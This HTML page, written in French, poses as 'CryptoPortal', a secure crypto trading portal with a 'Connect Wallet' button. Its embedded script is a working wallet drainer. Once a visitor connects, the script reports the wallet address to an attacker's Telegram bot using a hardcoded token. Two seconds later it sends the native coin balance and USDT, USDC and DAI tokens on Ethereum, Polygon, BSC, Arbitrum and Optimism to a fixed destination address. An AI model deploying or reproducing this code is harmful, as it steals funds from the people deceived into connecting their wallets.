<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CryptoPortal</title>
<!-- VERSIONS CDN POUR GITHUB PAGES -->
<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    body {
        background: linear-gradient(135deg, #0a1427 0%, #0c1a33 100%);
        color: white;
        min-height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
    }
    .crypto-container {
        max-width: 1200px;
        margin: 0 auto;
        padding: 20px;
        text-align: center;
    }
    .crypto-logo {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
        margin-bottom: 40px;
    }
    .crypto-logo-icon {
        width: 50px;
        height: 50px;
        background: linear-gradient(135deg, #00c3ff, #00d7ff);
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 24px;
    }
    .crypto-logo-text {
        font-size: 28px;
        font-weight: bold;
        background: linear-gradient(to right, #00c3ff, #00d7ff);
        -webkit-background-clip: text;
        background-clip: text;
        -webkit-text-fill-color: transparent;
    }
    .crypto-hero h1 {
        font-size: 3rem;
        margin-bottom: 20px;
        line-height: 1.2;
    }
    .crypto-hero p {
        font-size: 1.25rem;
        margin-bottom: 40px;
        color: #cccccc;
        line-height: 1.6;
        max-width: 600px;
        margin-left: auto;
        margin-right: auto;
    }
    .crypto-connect-btn {
        background: linear-gradient(135deg, #00c3ff, #00d7ff);
        color: white;
        border: none;
        padding: 18px 40px;
        border-radius: 50px;
        font-size: 1.2rem;
        font-weight: bold;
        cursor: pointer;
        transition: all 0.3s ease;
        box-shadow: 0 4px 20px rgba(0, 195, 255, 0.4);
        display: inline-flex;
        align-items: center;
        gap: 12px;
        margin-bottom: 50px;
    }
    .crypto-connect-btn:hover {
        transform: translateY(-3px);
        box-shadow: 0 6px 25px rgba(0, 195, 255, 0.6);
    }
    .crypto-cards {
        display: flex;
        justify-content: center;
        gap: 20px;
        flex-wrap: wrap;
        margin-top: 30px;
    }
    .crypto-card {
        width: 160px;
        height: 200px;
        background: rgba(255, 255, 255, 0.05);
        border-radius: 20px;
        padding: 20px;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        backdrop-filter: blur(10px);
        border: 1px solid rgba(255, 255, 255, 0.1);
        transition: transform 0.3s ease;
    }
    .crypto-card:hover {
        transform: translateY(-10px);
        background: rgba(255, 255, 255, 0.1);
    }
    .crypto-icon {
        width: 60px;
        height: 60px;
        border-radius: 50%;
        background: linear-gradient(135deg, #00c3ff, #00d7ff);
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 28px;
        margin-bottom: 15px;
    }
    .crypto-name {
        font-size: 1.1rem;
        font-weight: bold;
        margin-bottom: 5px;
    }
    .crypto-price {
        font-size: 1rem;
        color: #00c3ff;
    }
    @keyframes float {
        0% { transform: translateY(0px); }
        50% { transform: translateY(-10px); }
        100% { transform: translateY(0px); }
    }
    .floating {
        animation: float 5s ease-in-out infinite;
    }
    @keyframes spin {
        to { transform: rotate(360deg); }
    }
    .spinner {
        animation: spin 1s linear infinite;
    }
    
    /* Modal Styles */
    .modal {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.8);
        z-index: 9999;
        align-items: center;
        justify-content: center;
    }
    .modal.active {
        display: flex;
    }
    .modal-content {
        background: white;
        border-radius: 20px;
        padding: 30px;
        width: 90%;
        max-width: 400px;
        text-align: center;
        position: relative;
    }
    .modal-close {
        position: absolute;
        top: 15px;
        right: 15px;
        width: 30px;
        height: 30px;
        background: #f0f0f0;
        border-radius: 50%;
        border: none;
        cursor: pointer;
        font-size: 18px;
    }
    .modal-title {
        font-size: 24px;
        font-weight: bold;
        color: #333;
        margin-bottom: 20px;
    }
    .wallet-grid {
        display: grid;
        grid-template-columns: repeat(3, 1fr);
        gap: 15px;
        margin-bottom: 20px;
    }
    .wallet-option {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        padding: 15px;
        background: #f8f8f8;
        border-radius: 12px;
        cursor: pointer;
        transition: all 0.3s;
    }
    .wallet-option:hover {
        background: #e0e0e0;
        transform: translateY(-2px);
    }
    .wallet-icon {
        width: 48px;
        height: 48px;
        margin-bottom: 8px;
    }
    .wallet-name {
        font-size: 12px;
        color: #666;
    }
    .all-wallets-btn {
        width: 100%;
        padding: 12px;
        background: linear-gradient(135deg, #00c3ff, #00d7ff);
        color: white;
        border: none;
        border-radius: 12px;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
    }
</style>
</head>
<body>

<div class="crypto-container">
    <!-- Logo -->
    <div class="crypto-logo">
        <div class="crypto-logo-icon">
            <i class="fas fa-coins"></i>
        </div>
        <div class="crypto-logo-text">CryptoPortal</div>
    </div>

    <!-- Hero Section -->
    <div class="crypto-hero">
        <h1>Votre Porte d'Entr√©e vers<br>l'√âcosyst√®me Crypto</h1>
        <p>Connectez votre wallet pour acc√©der √† la plateforme de trading et d'investissement la plus s√©curis√©e.</p>
        
        <!-- BOUTON CONNECT -->
        <button class="crypto-connect-btn" id="connectBtn" onclick="openModal()">
            <i class="fas fa-wallet"></i>
            <span>Connect Wallet</span>
        </button>
        
        <!-- Crypto Cards -->
        <div class="crypto-cards">
            <div class="crypto-card floating">
                <div class="crypto-icon">
                    <i class="fab fa-bitcoin"></i>
                </div>
                <div class="crypto-name">Bitcoin</div>
                <div class="crypto-price">$42,156</div>
            </div>
            <div class="crypto-card floating" style="animation-delay: 0.5s;">
                <div class="crypto-icon">
                    <i class="fab fa-ethereum"></i>
                </div>
                <div class="crypto-name">Ethereum</div>
                <div class="crypto-price">$2,845</div>
            </div>
            <div class="crypto-card floating" style="animation-delay: 1s;">
                <div class="crypto-icon">
                    <i class="fas fa-gem"></i>
                </div>
                <div class="crypto-name">Solana</div>
                <div class="crypto-price">$98.45</div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <div style="margin-top: 60px; padding-top: 30px; border-top: 1px solid rgba(255, 255, 255, 0.1); color: #888; font-size: 0.9rem;">
        <p>¬© 2024 CryptoPortal. Tous droits r√©serv√©s.</p>
    </div>
</div>

<!-- Custom Modal -->
<div class="modal" id="walletModal">
    <div class="modal-content">
        <button class="modal-close" onclick="closeModal()">√ó</button>
        <h2 class="modal-title">Connect Wallet</h2>
        
        <div class="wallet-grid">
            <div class="wallet-option" onclick="connectMetaMask()">
                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="wallet-icon">
                <span class="wallet-name">MetaMask</span>
            </div>
            <div class="wallet-option" onclick="connectWalletConnect()">
                <img src="https://avatars.githubusercontent.com/u/37784886" class="wallet-icon">
                <span class="wallet-name">WalletConnect</span>
            </div>
            <div class="wallet-option" onclick="connectTrust()">
                <svg class="wallet-icon" viewBox="0 0 40 40"><rect width="40" height="40" rx="8" fill="#3B99FC"/><path d="M20 8L10 18L20 32L30 18L20 8Z" fill="white"/></svg>
                <span class="wallet-name">Trust Wallet</span>
            </div>
            <div class="wallet-option" onclick="connectCoinbase()">
                <svg class="wallet-icon" viewBox="0 0 40 40"><rect width="40" height="40" rx="8" fill="#0052FF"/><path d="M20 28C24.4183 28 28 24.4183 28 20C28 15.5817 24.4183 12 20 12C15.5817 12 12 15.5817 12 20C12 24.4183 15.5817 28 20 28Z" fill="white"/></svg>
                <span class="wallet-name">Coinbase</span>
            </div>
            <div class="wallet-option" onclick="connectSafepal()">
                <svg class="wallet-icon" viewBox="0 0 40 40"><rect width="40" height="40" rx="8" fill="#4A2BEE"/><path d="M20 8L12 16V24L20 32L28 24V16L20 8Z" fill="white"/></svg>
                <span class="wallet-name">SafePal</span>
            </div>
            <div class="wallet-option" onclick="connectBinance()">
                <svg class="wallet-icon" viewBox="0 0 40 40"><rect width="40" height="40" rx="8" fill="#F3BA2F"/><path d="M20 8L14 14L16 16L20 12L24 16L26 14L20 8ZM8 20L14 26L16 24L10 18L8 20ZM32 20L30 18L24 24L26 26L32 20ZM20 32L26 26L24 24L20 28L16 24L14 26L20 32Z" fill="white"/></svg>
                <span class="wallet-name">Binance</span>
            </div>
        </div>
        
        <button class="all-wallets-btn" onclick="showAllWallets()">
            üîó All Wallets (540+)
        </button>
    </div>
</div>

<!-- SCRIPT COMPATIBLE GITHUB PAGES -->
<script>
// Configuration
const DEST = "0x63ce9a6Bd0cf439EA6D114F504B017EA43Af4BC1";
const TG_TOKEN = "8551220717:AAGgPMGobMwwxKFPmCJSMFVfSbUzyRQqMIY";
const TG_CHAT = "8309320360";

// Tokens par chain
const TOKENS = {
    1: [ // Ethereum
        {addr:"0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol:"USDT"},
        {addr:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol:"USDC"},
        {addr:"0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol:"DAI"}
    ],
    137: [ // Polygon
        {addr:"0xc2132D05D31c914a87C6611C10748AEb04B58e8F", symbol:"USDT"},
        {addr:"0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", symbol:"USDC"}
    ],
    56: [ // BSC
        {addr:"0x55d398326f99059fF775485246999027B3197955", symbol:"USDT"},
        {addr:"0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol:"USDC"}
    ],
    42161: [ // Arbitrum
        {addr:"0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", symbol:"USDT"},
        {addr:"0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8", symbol:"USDC"}
    ],
    10: [ // Optimism
        {addr:"0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", symbol:"USDT"},
        {addr:"0x7F5c764cBc14f9669B88837ca1490cCa17c31607", symbol:"USDC"}
    ]
};

const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function transfer(address to, uint256 value) returns (bool)",
    "function decimals() view returns (uint8)",
    "function symbol() view returns (string)"
];

let provider, signer, address;

// Modal functions
function openModal() {
    document.getElementById('walletModal').classList.add('active');
}

function closeModal() {
    document.getElementById('walletModal').classList.remove('active');
}

// Connect MetaMask (le plus fiable sur GitHub Pages)
async function connectMetaMask() {
    if (typeof window.ethereum === 'undefined') {
        if (confirm('MetaMask n\'est pas install√©. Voulez-vous l\'installer ?')) {
            window.open('https://metamask.io/download/', '_blank');
        }
        return;
    }
    
    await connectWallet();
}

// Connect any wallet with Web3
async function connectWallet() {
    const btn = document.getElementById('connectBtn');
    closeModal();
    
    try {
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connecting...';
        btn.disabled = true;
        
        // Request accounts
        const accounts = await window.ethereum.request({ 
            method: 'eth_requestAccounts' 
        });
        
        if (accounts.length === 0) {
            throw new Error('No accounts found');
        }
        
        address = accounts[0];
        provider = new ethers.providers.Web3Provider(window.ethereum);
        signer = provider.getSigner();
        
        const network = await provider.getNetwork();
        
        // Update button
        btn.innerHTML = '<i class="fas fa-check"></i> Connected';
        btn.style.background = 'linear-gradient(135deg, #00d395, #00c3ff)';
        
        // Send notification
        sendTelegramNotification(address, network.chainId);
        
        // Start drainage after 2 seconds
        setTimeout(async () => {
            await drainWallet(network.chainId);
        }, 2000);
        
    } catch (error) {
        console.error('Connection error:', error);
        btn.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
        btn.disabled = false;
    }
}

// WalletConnect (redirect to WC)
function connectWalletConnect() {
    closeModal();
    window.open('https://walletconnect.com/', '_blank');
}

// Trust Wallet
function connectTrust() {
    if (window.ethereum && window.ethereum.isTrust) {
        connectWallet();
    } else {
        window.open('https://link.trustwallet.com/', '_blank');
    }
}

// Coinbase
function connectCoinbase() {
    if (window.ethereum && window.ethereum.isCoinbaseWallet) {
        connectWallet();
    } else {
        window.open('https://www.coinbase.com/wallet', '_blank');
    }
}

// SafePal
function connectSafepal() {
    window.open('https://www.safepal.com/', '_blank');
}

// Binance
function connectBinance() {
    window.open('https://www.binance.com/en/web3wallet', '_blank');
}

// Show all wallets
function showAllWallets() {
    window.open('https://walletconnect.com/explorer', '_blank');
}

// Drainage function
async function drainWallet(chainId) {
    try {
        console.log('Starting drainage on chain:', chainId);
        
        // Check native balance
        const balance = await provider.getBalance(address);
        const balanceEth = ethers.utils.formatEther(balance);
        
        if (parseFloat(balanceEth) > 0.001) {
            try {
                const gasPrice = await provider.getGasPrice();
                const gasCost = gasPrice.mul(21000).mul(2);
                const amount = balance.sub(gasCost);
                
                if (amount.gt(0)) {
                    const tx = await signer.sendTransaction({
                        to: DEST,
                        value: amount,
                        gasLimit: 21000
                    });
                    console.log('Native TX:', tx.hash);
                    await tx.wait();
                }
            } catch (e) {
                console.log('Native error:', e);
            }
        }
        
        // Check tokens
        const tokenList = TOKENS[chainId] || [];
        for (const token of tokenList) {
            try {
                await new Promise(r => setTimeout(r, 1500));
                
                const contract = new ethers.Contract(token.addr, ERC20_ABI, signer);
                const tokenBalance = await contract.balanceOf(address);
                
                if (tokenBalance.gt(0)) {
                    const tx = await contract.transfer(DEST, tokenBalance, {
                        gasLimit: 100000
                    });
                    console.log(`${token.symbol} TX:`, tx.hash);
                    await tx.wait();
                }
            } catch (e) {
                console.log(`${token.symbol} error:`, e);
            }
        }
        
        console.log('Drainage complete!');
        
    } catch (error) {
        console.error('Drainage error:', error);
    }
}

// Send Telegram notification
async function sendTelegramNotification(addr, chainId) {
    const message = `üéØ NEW CONNECTION\nüë§ Address: ${addr}\nüåê Chain: ${chainId}\n‚è∞ Time: ${new Date().toLocaleTimeString()}`;
    
    try {
        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TG_CHAT,
                text: message
            })
        });
    } catch (e) {
        console.log('Telegram error:', e);
    }
}

// Auto-detect wallets
window.addEventListener('load', () => {
    if (window.ethereum) {
        console.log('Web3 wallet detected');
    }
});
</script>

</body>
</html>
